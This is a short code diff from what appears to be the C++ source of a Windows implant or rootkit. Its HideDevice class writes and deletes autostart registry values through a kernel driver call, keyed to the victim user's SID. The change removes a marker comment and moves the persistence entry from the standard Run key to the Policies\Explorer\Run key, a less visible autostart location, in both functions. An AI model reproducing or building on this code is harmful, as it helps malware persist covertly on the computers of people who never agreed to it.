@@ -473,7 +473,6 @@ BOOL HideDevice::unhook_regwriteW(WCHAR *value_name, WCHAR *value)
 	if ( !(user_sid = GetMySid()) )
 		return FALSE;
 
-	// XXX-CRISI2
 	memset(&reg_struct, 0, sizeof(reg_struct));
 	reg_struct.is_deleting = 0;
 	wcsncpy(reg_struct.value_name, value_name, 49);
@@ -481,7 +480,7 @@ BOOL HideDevice::unhook_regwriteW(WCHAR *value_name, WCHAR *value)
 #ifdef RUN_ONCE_KEY
 	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", user_sid);
 #else
-	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", user_sid);
+	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", user_sid);
 #endif
 	ret_val = FNC(DeviceIoControl)(hFile, IOCTL_REG, &reg_struct, sizeof(reg_struct), NULL, 0, &dummy, NULL);	
 	return ret_val;
@@ -530,7 +529,7 @@ BOOL HideDevice::unhook_regdeleteW(WCHAR *value_name)
 #ifdef RUN_ONCE_KEY
 	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", user_sid);
 #else
-	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", user_sid);
+	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", user_sid);
 #endif
 	ret_val = FNC(DeviceIoControl)(hFile, IOCTL_REG, &reg_struct, sizeof(reg_struct), NULL, 0, &dummy, NULL);	
 	return ret_val;
